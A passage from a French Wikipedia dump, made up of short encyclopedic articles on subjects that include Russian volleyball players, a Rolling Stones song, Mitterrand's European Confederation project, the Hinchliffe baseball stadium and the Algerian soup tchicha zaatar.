Certains médias font état en avril 2014 de l'inquiétude d'élèves et de parents à propos de prétendues « dérives intégristes » lors de cours de catéchèse (interventions d'Alliance Vita). D'autres rumeurs, qui évoquent des pressions exercées sur des élèves non catholiques, sont fausses ou difficiles à vérifier. Alliance Vita s'estime diffamée. L'Opus Dei confirme avoir des membres enseignants de Gerson, mais nie intervenir dans l'établissement. Le diocèse de Paris et le ministère de l’Éducation cherchent à vérifier des rumeurs plus larges sur les méthodes de gestion de l'établissement.
Le , le Conseil de Paris demande « que la question des établissements scolaires privés sous contrat soit étudiée par l’Observatoire parisien de la Laïcité, que des membres de la direction du lycée Gerson soient auditionnés lors d’une prochaine séance de observatoire parisien de la Laïcité » . En juin, le conseil régional d'Île-de-France suspend sa subvention au lycée. Le , le ministère de l’Éducation nationale écrit dans une lettre adressée au conseil régional que le contrat entre l’État et le lycée privé est bien « respecté » et qu’« aucune atteinte à la liberté de conscience des élèves » n’a été constatée. La décision de suspension des subventions est annulée quelques jours plus tard par le préfet de région à la suite d’un recours déposé par Valérie Pécresse, au titre du contrôle de légalité.
Le , le porte-parole du ministère de l’Éducation nationale déclare que .

</doc>
<doc id="7900564" url="https://fr.wikipedia.org/wiki?curid=7900564" title="Igor Oleinikov">
Igor Oleinikov

Igor Oleinikov (en ) est un joueur russe de volley-ball né en 1985. Il mesure et joue central.
Palmarès.
Néant.

</doc>
<doc id="7900574" url="https://fr.wikipedia.org/wiki?curid=7900574" title="Leptobrachium kantonishikawai">
Leptobrachium kantonishikawai

Leptobrachium kantonishikawai est une espèce d'amphibiens de la famille des Megophryidae.
Répartition.
Cette espèce est endémique du Sarawak en Malaisie orientale.
Étymologie.
Cette espèce est nommée en l'honneur de Kanto Nishikawa.

</doc>
<doc id="7900580" url="https://fr.wikipedia.org/wiki?curid=7900580" title="Hans Öberg">
Hans Öberg

Hans Öberg, né le à Hemlingby en Suède et mort le à Gävle, est un joueur professionnel suédois de hockey sur glace qui évoluait en position d'ailier.

</doc>
<doc id="7900583" url="https://fr.wikipedia.org/wiki?curid=7900583" title="Isa Arsabiev">
Isa Arsabiev

Isa Rouslanovitch Arsabiev (en ) est un joueur russe de volley-ball né le . Il mesure et joue central.
Palmarès.
Néant.

</doc>
<doc id="7900584" url="https://fr.wikipedia.org/wiki?curid=7900584" title="Nécrose caséeuse">
Nécrose caséeuse

La nécrose caséeuse est une forme de nécrose tissulaire dans laquelle l'aspect du tissu rappelle celui du fromage (caseum). Elle est typiquement associée à la tuberculose.
Causes.
Généralement la nécrose caséeuse se rencontre dans les foyers de contamination des infections de la tuberculose. Elle peut aussi être causée par la syphilis et certains champignons (dans les mycoses), par exemple l'histoplasmose, la cryptococcose et la coccidioïdomycose.
Pathologie.
Les cellules mortes subissent une désintégration partielle, laissant des particules granulaires visibles à l'œil nu. La texture granulaire ainsi que la teinte blanchâtre ou jaunâtre sont des caractéristiques distinctives de cette forme de nécrose.
Au niveau microscopique, on observe l'absence totale de structure tissulaire. On retrouve ainsi des zones éosinophiliques (rosées) acellulaires, entourées de processus inflammatoires granulomateux.

</doc>
<doc id="7900601" url="https://fr.wikipedia.org/wiki?curid=7900601" title="Johan Bär">
Johan Bär

Johan Bär, né le à Narva et mort le à Malmö, est un amiral suédois.
Biographie.
Fils d'une ancienne famille de la noblesse de Courlande, il commence sa carrière militaire en 1642 et est nommé lieutenant dans l'Amirauté en 1645. Il est nommé responsable des opérations militaires de la province de Södermanland en 1648 et pair du royaume l'année suivante. En 1653, lors de la première guerre du Nord, il commande un navire de la flotte de Carl Gustaf Wrangel au cours d'opérations contre le Danemark et est élevé au grade de lieutenant-amiral en 1659. En 1664, il a la charge d'inspecter et surveiller le rassemblement de la flotte suédoise dans les provinces de Finlande et de l'archipel d'Åland.
Lors de la guerre de Scanie, il est nommé vice-amiral en 1675. Il commande une escadre dans la flotte de l'amiral Lorentz Creutz et participe à ce titre aux batailles de Jasmund et d'Öland en 1676. Déjà blâmé par Creutz pour son comportement lors de la première bataille, il est mis en cause pour son inaction présumée lors de la lourde défaite infligée par la flotte dano-néerlandaise à Öland. Il est acquitté par la commission chargée d'enquêter sur les événements mais plus aucun commandement ne lui est confié par la suite et il passe ses dernières années dans sa propriété près de Malmö.
Marié à Anna Kristina Slatte (1646-1071), il a avec elle un fils, également prénommé Johan (1673-1742), qui sera lieutenant-colonel et commandant de la forteresse d'Älvsborg, à Göteborg.

</doc>
<doc id="7900605" url="https://fr.wikipedia.org/wiki?curid=7900605" title="Stupid Girl (chanson des Rolling Stones)">
Stupid Girl (chanson des Rolling Stones)

 est une chanson du groupe de rock 'n' roll britannique The Rolling Stones figurant sur son album de 1966 "Aftermath". Elle est aussi sortie en face B du single "Paint It, Black" aux États-Unis.
" a été enregistré aux studios RCA de Los Angeles entre les 6 et . 
La chanson ' a été interprétée par les Stones lors de leur tournée de 1966. Elle a été incluse dans la compilation de 1989 '.
Analyse artistique.
Analyse des paroles.
Écrite par Mick Jagger et Keith Richards, " est connue pour ses paroles apparemment dégradantes envers les femmes, critique faite également concernant d'autres chansons des Rolling Stones comme "Under My Thumb". Dans "Stupid Girl", tout ce qui concerne la jeune femme est source de moquerie.L'attaque se fait plus féroce au fil des couplets : Cette fille stupide est cupide, critique les gens sans les connaître et critique les choses qu'elle n'a jamais vues. Les paroles s'adressent-elles à toutes les femmes ? dit dans sa critique :
Sur les paroles de la chanson, Richards a dit en 1971 dans une interview du magazine "Rolling Stone" :
Il n'est pas impossible que le chanteur s'en prenne en réalité à sa petite amie du moment Chrissie Shrimpton. Les deux amants s'étaient rencontrés en 1962 à la London School of Economics. Elle était encore secrétaire à Covent Garden (pas encore mannequin) quand Mick la quitta durant l'année 1966 pour se mettre en couple avec la chanteuse Marianne Faithfull. Dans une interview en 1995, Mick reconnaîtra qu'il traversait une période difficile : 
Structure musicale.
C'est Charlie Watts qui commence la chanson aux toms. "" est un rock médium dont la rythmique emprunte à "Uptight (Everything's Alright)" de Stevie Wonder. Mick Jagger interprète son texte d'un ton sarcastique proche de l'invective, aux accents parfois puérils.
Keith Richards se charge de la guitare solo et de la guitare acoustique, laissant la guitare rythmique à Brian Jones, tandis que le bassiste assure une ligne de basse solide et le jeu de Ian Stewart à l'orgue est essentiel au morceau. Quant à l'arrangeur Jack Nitzsche, il est au tambourin.
Reprises notables.
The Trolls (groupe de garage américain des années 1960) de Pueblo (Colorado) ont repris cette chanson sur "Warrior Records" en 1966.
Ellen Foley a repris ' sur son album de 1979, '.
Sue Foley a repris ' sur son album de 2002, '.

</doc>
<doc id="7900612" url="https://fr.wikipedia.org/wiki?curid=7900612" title="Viktor Nikonenko">
Viktor Nikonenko

Viktor Nikonenko (en ) est un joueur russe de volley-ball né le . Il mesure et joue central.
Palmarès.
Néant.

</doc>
<doc id="7900615" url="https://fr.wikipedia.org/wiki?curid=7900615" title="SEPM">
SEPM

Le sigle ou l'acronyme SEPM peut signifier :

</doc>
<doc id="7900621" url="https://fr.wikipedia.org/wiki?curid=7900621" title="Duke Robillard">
Duke Robillard

Michael John "Duke" Robillard, né le à Woonsocket (Rhode Island) est un guitariste et chanteur de blues américain.
Après avoir joué dans divers groupes et travaillant pour le fabricant de guitares Guild, il a co-fondé le groupe avec le pianiste en 1967. Il a également été un membre de The Fabulous Thunderbirds, remplaçant Jimmie Vaughan à la guitare. Également expérimenté en jazz, swing et rock 'n' roll en plus du blues qu'il affectionne.
Nominations et récompenses.
Duke Robillard a été nommé et a reçu diverses récompenses durant sa carrière. Parmi celles-ci :

</doc>
<doc id="7900630" url="https://fr.wikipedia.org/wiki?curid=7900630" title="Prix Pulitzer du service public">
Prix Pulitzer du service public

Le prix Pulitzer du service public ("") est l'un des prix décerné dans le domaine du journalisme américain par les membres du comité Pulitzer de l'université Columbia. Créé en 1918, il récompense un journal ou un site d'actualités dont la couverture d'un événement a rendu un « service public ».
Il s'agit du prix principal remis par le comité et le seul qui remet une médaille d'or ; c'est le prix le plus prestigieux qu'un quotidien ou un magazine américain peut recevoir.

</doc>
<doc id="7900633" url="https://fr.wikipedia.org/wiki?curid=7900633" title="Bouddha saute par-dessus le mur">
Bouddha saute par-dessus le mur

Bouddha saute par-dessus le mur (en chinois : 佛跳牆 ; pinyin : "fó tiào qiáng") est une variété de soupe aux ailerons de requin dans la cuisine de Canton et du Fujian, créé sous la dynastie Qing. Le nom du plat fait référence à sa capacité supposée à amener des moines bouddhistes à renoncer au végétarisme afin de pouvoir y goûter. Il est riche en protéines et en calcium.
Sa préparation requiert un grand nombre d'ingrédients (jusqu'à une trentaine) et un à deux jours de préparation. Les ingrédients varient suivant les recettes, mais incluent en général des œufs de caille, des pousses de bambou, des coquilles Saint-Jacques, des holothuries, des ailerons de requin, des ormeaux, du poulet, du jambon fumé, du tendon de porc, du ginseng, des champignons et du taro. L'utilisation d'ailerons de requin est controversée en raison de la pratique du "shark finning" (« pêche aux ailerons »), consistant à ne prélever que les ailerons des requins pêchés et à rejeter ces derniers à la mer, mutilés ; certains restaurants ont renoncé à proposer ce plat pour cette raison, notamment celui du .

</doc>
<doc id="7900651" url="https://fr.wikipedia.org/wiki?curid=7900651" title="Pavel Gourtchenko">
Pavel Gourtchenko

Pavel Gourtchenko (en ) est un joueur russe de volley-ball né le . Il mesure et joue réceptionneur-attaquant.
Palmarès.
Néant.

</doc>
<doc id="7900675" url="https://fr.wikipedia.org/wiki?curid=7900675" title="Vienne, premier avril an 2000">
Vienne, premier avril an 2000

Vienne, premier avril an 2000 (titre original : "1. April 2000") est un film autrichien réalisé par Wolfgang Liebeneiner, sorti en 1952.
Synopsis.
Après de nombreuses négociations infructueuses avec les Alliés au sujet de la fin de l'occupation de l'Autriche et de son indépendance, le chancelier fédéral d'Autriche incite ses compatriotes à déchirer leurs cartes d'identité en quatre langues, qui ont été délivrées par les Alliés, envoyant ainsi un signal clair au monde entier. L'Autriche est ensuite accusée de vouloir rompre la paix mondiale devant un tribunal mondial, qui la soupçonne de préparer une Troisième Guerre mondiale.
Les membres du tribunal mondial survolent Vienne dans leur fusée spatiale et atterrissent devant le château de Schönbrunn. Les Autrichiens doivent alors leur prouver qu'ils sont une belle nation et qu'ils ne briseront jamais la paix mondiale. Ils vont donc leur présenter tout ce qui rend leur nation avenante en commençant par Mozart, puis par le prince Eugène de Savoie, l'impératrice Marie-Thérèse d'Autriche, le vin viennois, la valse viennoise, les , les orchestres classiques et ainsi de suite. Malgré les preuves présentées, l'Autriche est déclarée coupable mais juste avant que la condamnation ne soit prononcée, on rend publique la déclaration de Moscou de 1943. Cette déclaration indique clairement que l'Anschluss est nulle et non avenue, signifiant que l'Autriche doit être libérée de toute présence étrangère sur son sol. Les puissances alliées conviennent alors de quitter le pays.
De retour à l'époque actuelle en 1952, on déplore que ces actions et l'indépendance de l'Autriche n'auront lieu qu'en l'an 2000.
Distinctions.
Le film a été présenté en sélection officielle en compétition au Festival de Cannes 1953.

</doc>
<doc id="7900691" url="https://fr.wikipedia.org/wiki?curid=7900691" title="Breath">
Breath



</doc>
<doc id="7900696" url="https://fr.wikipedia.org/wiki?curid=7900696" title="1829 en arts plastiques">
1829 en arts plastiques

Cette page concerne l'année 1829 en arts plastiques.

</doc>
<doc id="7900704" url="https://fr.wikipedia.org/wiki?curid=7900704" title="Andriy Kutsmus">
Andriy Kutsmus

Andriy Kutsmus (en ) est un joueur ukraine de volley-ball né le à Rivne (RSS d'Ukraine). Il mesure et joue réceptionneur-attaquant.

</doc>
<doc id="7900706" url="https://fr.wikipedia.org/wiki?curid=7900706" title="Besharam (film, 1978)">
Besharam (film, 1978)

Besharam (hindi: बेशरम, « effronté », « éhonté ») est un thriller produit et réalisé par l'acteur vétéran Deven Verma, sorti en 1978. 
Ce film en hindi est le premier film que Deven Verma dirige, avec comme acteurs principaux Amitabh Bachchan, Sharmila Tagore, Amjad Khan, A. K. Hangal, Iftekhar, Nirupa Roy et Deven Verma. La musique du film a été composée par Kalyanji Anandji.

</doc>
<doc id="7900710" url="https://fr.wikipedia.org/wiki?curid=7900710" title="Maksim Pourine">
Maksim Pourine

Maksim Pourine (en ) est un joueur russe de volley-ball né le . Il mesure et joue réceptionneur-attaquant.
Palmarès.
Néant.

</doc>
<doc id="7900717" url="https://fr.wikipedia.org/wiki?curid=7900717" title="Aporometra">
Aporometra

Aporometra est un genre de crinoïdes de l'ordre des Comatulida, le seul de la famille des Aporometridae, endémique d'Australie.
Description et caractéristiques.
Ce sont de petites notocrinoïdes, avec un centrodorsal arrondi voire presque conique, et un apex aboral plus ou moins aplati et rugueux. La face orale porte des fosses radiales peu profondes. La moitié aborale de la cavité centrodorsale porte un stéréome spongieux, sans fosses aborales ou étoile dorsale. Les cirrhes sont lisses, sans épines aborales ; les cirrhes distales sont aplatis.
Ce sont des comatules vivipares, les pinnules génitales portant les gonades et des poches d'incubation.
Liste des espèces.
Selon :

</doc>
<doc id="7900724" url="https://fr.wikipedia.org/wiki?curid=7900724" title="Besharam">
Besharam

Besharam (en hindi बेशरम, « effronté », « éhonté ») peut désigner : 

</doc>
<doc id="7900725" url="https://fr.wikipedia.org/wiki?curid=7900725" title="Anton Botine">
Anton Botine

Anton Botine (en ) est un joueur russe de volley-ball né le . Il mesure et joue réceptionneur-attaquant.
Palmarès.
Néant.

</doc>
<doc id="7900731" url="https://fr.wikipedia.org/wiki?curid=7900731" title="Aporometridae">
Aporometridae



</doc>
<doc id="7900739" url="https://fr.wikipedia.org/wiki?curid=7900739" title="Luis Barboo">
Luis Barboo

Luis Barboo, né le à Vigo et mort le à Madrid, est un acteur espagnol.
Biographie.
Artiste de cirque, il devient cascadeur pour le cinéma et ensuite acteur. En trente ans de carrière, de 1964 à 1994, il est apparu dans plus de 135 films ou séries télévisées, dont une quarantaine de westerns spaghettis et de nombreux films d'horreur (une douzaine de collaborations avec le réalisateur Jesús Franco), la plupart du temps dans des seconds rôles de méchants barbus et musclés.

</doc>
<doc id="7900740" url="https://fr.wikipedia.org/wiki?curid=7900740" title="Confédération européenne">
Confédération européenne

La Confédération européenne est un projet porté par le Président de la République française François Mitterrand à la suite des nombreux bouleversements que connaît l'Europe en 1989. Cependant, cette idée ne rencontrera pas le succès escompté par la diplomatie française.
Les origines du projet de Confédération européenne.
L'annonce du projet.
Lors de la cérémonie des vœux du 31 décembre 1989, dans un contexte marqué par la fin du rideau de fer et du bloc communiste, François Mitterrand exprime sa volonté de voir se former une confédération européenne réunissant tous les pays du continent. Cette annonce se fait sans aucune consultation auprès de ses conseillers, de son ministre des Affaires étrangères Roland Dumas ou encore de ses partenaires européens . Plusieurs critères sont alors édictés par le Chef de l'État pour prétendre participer à cette nouvelle structure : respect du pluralisme des partis, organisation d'élections libres, instauration d'un système représentatif, et garantie de la liberté d'information. À l'origine cette organisation doit permettre d'assurer des « échanges », « la paix », et « la sécurité » sur le continent européen .
Cette prise de position intervient alors que le chancelier Helmut Kohl souhaite engager l'Allemagne sur la voie de la réunification avec la présentation au Bundestag de son Plan en dix points du 28 novembre 1989. Depuis le sommet européen de Strasbourg du 8 décembre 1989, les douze États-membres se sont quant à eux tournés vers la préparation de l'Union économique et monétaire en décidant l'ouverture d'une Conférence intergouvernementale avant la fin de l'année 1990 pour préparer les négociations. Elles mèneront à la signature du traité de Maastricht le 7 février 1992. Les pays de l'Est commencent à se détacher de l'Union soviétique et entament leur transition démocratique. En République Démocratique d'Allemagne, Egon Krenz démissionne de la tête du Conseil d'État de la RDA. En Tchécoslovaquie, à la suite de la révolution de velours, le dissident et écrivain Václav Havel est devenu le Président de la République, tandis qu'Alexander Dubček, partisan d'un socialisme à visage humain, devient le Président du Parlement .
La réception du projet.
 Le projet reçoit dans un premier temps un avis favorable de la part des Chefs d'État occidentaux. Le Chancelier Helmut Kohl y apporte son soutien le 4 janvier lors d'une rencontre franco-allemande à Latche. Les pays de l'Est apportent aussi leur soutien à ce nouveau dessein. Le secrétaire général du Parti Communiste de l'Union Soviétique Mikhaïl Gorbatchev réagit aussi de manière positive en voyant de nombreux points communs entre la proposition de François Mitterrand et sa vision de la politique extérieure .
L'organisation de la confédération.
L'élaboration du projet.
Il s'agit de bâtir une nouvelle structure paneuropéenne pour contribuer à l'établissement d'un nouvel ordre européen après la fin de la Guerre froide. Elle est entérinée lors du sommet de la CSCE, organisé à Paris. Les États-membres y ratifient alors le Traité sur les forces conventionnelles en Europe, ainsi que la Charte de Paris ou Charte de Paris pour une nouvelle Europe. Le 13 septembre 1990, lors d'une visite d'État en Tchécoslovaquie, François Mitterrand propose que des assises soient organisées à Prague pour lancer le projet de confédération européenne. La proposition est acceptée par Vaclav Havel. Le projet prend forme avec la désignation de Jean Musitelli au poste de chargé de mission au mois de décembre 1990. Il compose sa propre équipe et travaille en étroite concertation avec la cellule diplomatique de l'Élysée et le Quai d'Orsay. Il constitue aussi un comité d'experts présidé par le géographe spécialiste de la question des frontières, Michel Foucher. Un correspondant tchèque est aussi désigné par Vaclav Havel pour coordonner l'action entre les deux pays. Dans le courant du mois d'avril, Roland Dumas envoie un mémorandum à l'ensemble des partenaires européens pour présenter le projet .
Les Assises de Prague.
 Près de 150 personnalités, issues du monde de la culture, des affaires ou d'anciens hommes politiques, se réunissent les 13 et 14 juin 1991 à Prague. Des groupes de travail sont organisés autour de six grandes commission thématiques : la culture, la circulation des personnes, les communications, l'énergie, l'environnement, les questions générales. La délégation française est composée par
 Mais les Assises ne connaîtront que peu de développement et la confédération européenne restera un « projet mort-né » pour Roland Dumas . Le Président de la République a dû accepter la présence d'invités américains sur la demande insistante des Tchécoslovaques. Si bien que l'on y trouve non seulement des Européens, mais aussi des Canadiens et des Japonais. Les Assises sont ouvertes par Vaclav Havel qui exprime d'ailleurs ses réticences quant au projet, tandis que François Mitterrand en assure le discours de clôture .
L'échec de la confédération européenne.
Les oppositions des États-Unis et de l'Allemagne.
 Plusieurs raisons ont conduit au non-développement du projet de confédération. Plusieurs partenaires qui, dans un premier temps, s'étaient montrés favorables finissent par exprimer des réticences. Tout d'abord, les États-Unis entreprennent un travail de sape contre le projet de confédération dans lequel ils ne sont pas inclus . 
L'Allemagne se montre de moins en moins encline à soutenir le projet et préfère soutenir le développement et l'institutionnalisation de la CSCE qui implique la participation des États-Unis.
Les réticences des pays de l'Est.
 Mais ce sont des pays de l'Est que les principales réticences vont émaner. Ces derniers ne veulent pas devenir membre d'une structure dans laquelle les États-Unis seraient exclus, tandis que l'Union soviétique y serait admise. Par ailleurs, les pays de l'Est vont progressivement voir la confédération européenne comme un moyen de retarder leur intégration à la Communauté économique européenne .
Cette position est confortée par une déclaration de François Mitterrand, à la veille de l'ouverture des Assises, lequel déclare que l'adhésion ne sera pas possible avant une dizaine d'années. La conjugaison de tous ces facteurs empêcheront le développement du projet de confédération européenne.

</doc>
<doc id="7900741" url="https://fr.wikipedia.org/wiki?curid=7900741" title="Rémunération au titre du prêt en bibliothèque">
Rémunération au titre du prêt en bibliothèque



</doc>
<doc id="7900745" url="https://fr.wikipedia.org/wiki?curid=7900745" title="Sergueï Andrievski">
Sergueï Andrievski

Sergueï Andrievski (en ) est un joueur russe de volley-ball né le . Il mesure et joue attaquant.
Palmarès.
Néant.

</doc>
<doc id="7900752" url="https://fr.wikipedia.org/wiki?curid=7900752" title="Nikita Ieremine">
Nikita Ieremine

Nikita Vasilievitch Ieremine (en ) est un joueur russe de volley-ball né le . Il mesure et joue central.
Palmarès.
Néant.

</doc>
<doc id="7900753" url="https://fr.wikipedia.org/wiki?curid=7900753" title="Teflon Don">
Teflon Don

Teflon Don est le quatrième album studio de Rick Ross, sorti le .
L'album s'est classé au Billboard 200, au Top R&amp;B/Hip-Hop Albums, Top Rap Albums et au Top Digital Albums et a été certifié disque d'or par la Recording Industry Association of America (RIAA) le .

</doc>
<doc id="7900771" url="https://fr.wikipedia.org/wiki?curid=7900771" title="Sierra Nevada (Bétique)">
Sierra Nevada (Bétique)



</doc>
<doc id="7900775" url="https://fr.wikipedia.org/wiki?curid=7900775" title="Tamron SP AF 150-600mm f/5-6.3 DI VC USD">
Tamron SP AF 150-600mm f/5-6.3 DI VC USD

Le Tamron SP AF 150-600mm f/5-6.3 DI VC LD USD est un téléobjectif produit par Tamron. Il a été commercialisé en mars 2014.

</doc>
<doc id="7900781" url="https://fr.wikipedia.org/wiki?curid=7900781" title="SP AF 150-600mm f/5-6.3 DI VC USD">
SP AF 150-600mm f/5-6.3 DI VC USD



</doc>
<doc id="7900786" url="https://fr.wikipedia.org/wiki?curid=7900786" title="E503 (additif)">
E503 (additif)



</doc>
<doc id="7900789" url="https://fr.wikipedia.org/wiki?curid=7900789" title="E504 (additif)">
E504 (additif)



</doc>
<doc id="7900796" url="https://fr.wikipedia.org/wiki?curid=7900796" title="Dmitri Kiritchenko">
Dmitri Kiritchenko



</doc>
<doc id="7900800" url="https://fr.wikipedia.org/wiki?curid=7900800" title="Jean-Yves Malmasson">
Jean-Yves Malmasson

Jean-Yves Malmasson (né en 1963, à Saint-Cloud) est un compositeur et un chef d'orchestre français.
Biographie.
Après des études de piano et d'ondes Martenot, ainsi que de composition au Conservatoire national de région de Boulogne-Billancourt, il a continué à étudier la composition et direction d'orchestre au Conservatoire national supérieur de musique de Paris, où il a remporté un premier prix de composition. Son poème symphonique orchestral « "Le chant de Dahut" » pour ondes Martenot et orchestre a remporté le prix de la SACEM en 1988 au Festival des tombées de la nuit, à Rennes.
Ses principaux professeurs sont Alain Louvier, Pierre Grouvel, Serge Nigg, Jacques Charpentier (technique d'écriture musicale et composition), et Jean-Claude Hartemann et Jean-Sébastien Bereau (direction).
Les compositions de Malmasson sont écrites dans un style expressif, à tonalité élargie qui utilise beaucoup de vocabulaire harmonique emprunté au style d'Olivier Messiaen (notamment dans l'œuvre de jeunesse « "Un feu ardent dans un silence noir et froid" » pour piano ). Malmasson est souvent inspiré par l'espace et l'astronomie ("Mare Nostrum" pour orchestre, "Coro") .
En plus d'être le directeur musical de l'orchestre de la ville de Puteaux, un poste qu'il occupe depuis 1988, Jean- Yves Malmasson est également directeur de l'Orchestre philharmonique des Yvelines et de l'Ouest francilien et depuis 2007 de l'Orchestre symphonique de Villebon-sur-Yvette.

</doc>
<doc id="7900803" url="https://fr.wikipedia.org/wiki?curid=7900803" title="International Relations and Security Network">
International Relations and Security Network

L’International Relations and Security Network (ISN) est un service d’information en ligne publiquement accessible traitant des relations internationales et de la politique de sécurité.
La plateforme est opérée à Zurich par le Center for Security Studies (CSS) de l‘École polytechnique fédérale de Zurich (EPFZ, en allemand Eidgenössische Technische Hochschule Zürich, ETHZ).
Histoire.
Depuis sa création en 1994, le réseau du ISN diffuse, gère, et produit des contenus accessibles en ligne et traitant des relations internationales et de la politique de sécurité; ainsi, il encourage la coopération entre institutions travaillant et faisait de la recherche dans ce domaine. L'ISN est financé par le Département fédéral de la défense, de la protection de la population et des sports.

</doc>
<doc id="7900805" url="https://fr.wikipedia.org/wiki?curid=7900805" title="Welf II d'Altdorf">
Welf II d'Altdorf

 (né vers 960/970 - mort le ) est un comte souabe membre de l'ancienne lignée des Welfs.
Origine.
Welf est le fils cadet de , comte d'Altdorf et d'Ida, fille du duc de Souabe .
Biographie.
Du fait de son union Welf avait la faveur d' mais il s'oppose à l'élection de en 1024 qu'il considère contraire aux intérêts de sa famille. il se rebelle avec son parent , mais ils doivent finalement s'incliner.
Au début de la décennie 1020, Welf entre d'abord en conflit avec l'évêque de Strasbourg Werner de Habsbourg en 1026 il est impliqué dans une véritable guerre contre les Diocèses d'Augsbourg et de Freising. Il pille le trésor de l'évêque Bruno d'Augsbourg (1006-1029) et saccage la cité d'Augsbourg. Accusé de haute trahison à Ulm par l'empereur il est déchu de son comté en 1027 et il meurt emprisonné. Il est inhumé à Altdorf.
 avait épousé Imiza de Luxembourg, fille du comte Frédéric de Luxembourg. avec qui il a deux enfants :
Sources.
, édition du .

</doc>
<doc id="7900816" url="https://fr.wikipedia.org/wiki?curid=7900816" title="Moctar Moussa Mahamat">
Moctar Moussa Mahamat

Moctar Moussa Mahamat, né le à Souar (Tchad), est un agronome et homme politique tchadien. 
Il a été plusieurs fois ministre entre et .
Ingénieur agronome, il est titulaire d'un doctorat en sciences agronomique et en nutrition animales. À partir de 1997, il est ministre de l’Élevage, ministre de l’Agriculture et ministre du Pétrole. Il a été plusieurs fois gouverneur et représentant spécial du chef de l’État auprès des forces des Nations unies à l'est du Tchad.

</doc>
<doc id="7900818" url="https://fr.wikipedia.org/wiki?curid=7900818" title="Vladislav Jloba">
Vladislav Jloba

Vladislav Anatolievitch Jloba (en ) est un joueur russe de volley-ball né le à Gomel (RSS de Biélorussie). Il mesure et joue passeur.

</doc>
<doc id="7900822" url="https://fr.wikipedia.org/wiki?curid=7900822" title="Stade Hinchliffe">
Stade Hinchliffe

Le stade Hinchliffe est un stade de baseball historique de la ville de Paterson, dans l'État du New Jersey, aux États-Unis.
Rénové à des fins scolaires pour une utilisation par les équipes d'athlétisme et de football, il accueille l'équipe de baseball professionnel des Jackals du New Jersey à partir de 2023.
Historique.
Le stade est officiellement ouvert le . Il est baptisé du nom d'un ancien maire démocrate de la ville, John Hinchliffe. 
Le stade a été le domicile de plusieurs clubs professionnels des ligues noires, au temps de la ségrégation raciale dans le baseball. De 1933 à 1937 et de 1939 à 1945, le stade Hinchliffe est le domicile des Black Yankees de New York, et de 1935 à 1936 il est celui des Cubans de New York de la "Negro National League". Le stade est le lieu des performances de 20 membres du temple de la renommée, dont Larry Doby.
Le stade est utilisé au fil des ans comme lieu événementiel pour des matches de football, de baseball, de boxe, des courses de véhicules et de motocyclette ainsi que des concerts. Les Andrew Sisters, Abbott et Costello et Duke Ellington se produisent en outre dans le stade.
Utilisé à des fins d'athlétisme scolaire, le stade est fermé en 1997 en raison de son manque d'entretien. Il est menacé de démolition par le conseil scolaire de Paterson en 2002.
En 2021, il est rénové à des fins scolaires; il est alors conçu pour accueillir les activités d'athlétisme et de football de l'école secondaire John F. Kennedy. À partir de 2023, il accueille aussi du baseball professionnel en devenant le domicile des Jackals du New Jersey. L'annonce sème l'inquiétude dans le milieu scolaire, qui redoute d'éventuels conflits de cohabitation entre le baseball professionnel et le sport scolaire amateur.
Protection.
Le stade Hinchliffe est l'un des derniers stades existants des ligues noires de baseball. Il est à ce titre protégé tant au niveau fédéral qu'au niveau régional. Il est inscrit en 2004 au Registre national des lieux historiques au niveau national et au au niveau régional.

</doc>
<doc id="7900844" url="https://fr.wikipedia.org/wiki?curid=7900844" title="Tchicha zaatar">
Tchicha zaatar

La tchicha zaatar est une soupe traditionnelle algérienne.
Origine et étymologie.
Cette soupe est originaire de Tlemcen. Son nom provient de l'arabe algérien "tchicha" (ou "dchicha") et se traduit par « soupe à la semoule d'orge et au "zaatar" ». "Zaatar" signifie « thym », autrement dit, c'est une soupe au thym.
Description.
Il s'agit d'une soupe contenant de la viande et des épices, telles le ras el-hanout et le paprika, mais aussi l'indispensable "zaatar".
C'est une soupe spécialement conçue pour le premier jour de fête de la fin du ramadan, Aid el-Fitr, qui doit être mangée le matin à la place du petit déjeuner classique, car durant les vingt-neuf ou trente jours du mois du ramadan, le corps s'est habitué à un certain régime alimentaire. Cette soupe a la fonction de remède de passation.
Les Tlemcenniens l'utilisent pour les convalescents ou ceux qui sont malades (rhume, toux…), étant donné les vertus médicinales que possède l'origan.

</doc>
<doc id="7900851" url="https://fr.wikipedia.org/wiki?curid=7900851" title="Perreault Casgrain">
Perreault Casgrain

Perreault Casgrain, né à Québec le et mort à Montréal le , est un avocat et homme politique québécois.
Biographie.
Jeunesse et études.
Il fait ses études au pensionnat Saint-Jean-Berchmans à Québec, au Séminaire de Québec, au St. Procoplus College à Chicago (Illinois), devenu Benedictine University, au Collège de Sainte-Anne-de-la-Pocatière et à l’Université Laval.
Admis au Barreau du Québec en 1920, il obtient le titre de conseiller du Roi (C.R.) en 1930.
Il pratique le droit à Rimouski (1920-1974) puis à Montréal (1974-1981). En 1974, en effet, il quitte la société Casgrain Desrosiers Lévesque Bujold Villeneuve, fondée en 1877 à Rimouski, devenue en 1999 Cain Lamarre Casgrain Wells, S.E.N.C.R.L./avocats, pour s'installer, jusqu'en 1981, à titre d'avocat-conseil auprès de l’étude légale montréalaise Lavery, O’Brien, devenue en 2013 Lavery Droit-Affaires.
Carrière politique.
Perreault Casgrain est élu député libéral dans Gaspé-Nord à l'élection générale du 25 octobre 1939. Ministre sans portefeuille dans le gouvernement Gouvernement Godbout en 1942, il est défait à l'élection générale du 8 août 1944.
Selon Perreault Casgrain, le premier ministre Adélard Godbout était un . Il déclare ainsi, le : .
Il est président de l’Association du Barreau canadien en 1942 et 1951, bâtonnier du Barreau du Bas-Saint-Laurent en 1940-1941 et vice-président de l’Union internationale des avocats en 1968 et 1969.
Vie familiale.
Perreault Casgrain est membre de la famille Casgrain, famille illustre dans l’histoire politique du Québec. Il est l’arrière-petit-fils de Charles-Eusèbe Casgrain (1800-1848), député de Kamouraska en 1830, petit-fils de Joseph-Alfred Mousseau (1837-1886), premier ministre du Québec (1882-1884), et de Philippe Baby Casgrain, député du Parti libéral du Canada dans L’Islet (1872-1891), petit-neveu de Charles-Eugène (Charles Eusèbe) Casgrain, sénateur (1887-1907) et de Charles-Alphonse-Pantaléon Pelletier (1837-1911), député de Kamouraska à la Chambre des communes du Canada et lieutenant-gouverneur du Québec (1908-1911), frère de Jacques Casgrain (1908-1992), juge à la Cour provinciale du Québec, et père de Philippe Casgrain.

</doc>
<doc id="7900854" url="https://fr.wikipedia.org/wiki?curid=7900854" title="Olivier Truc">
Olivier Truc

Olivier Truc est un journaliste, écrivain et scénariste français né à Dax le .
Biographie.
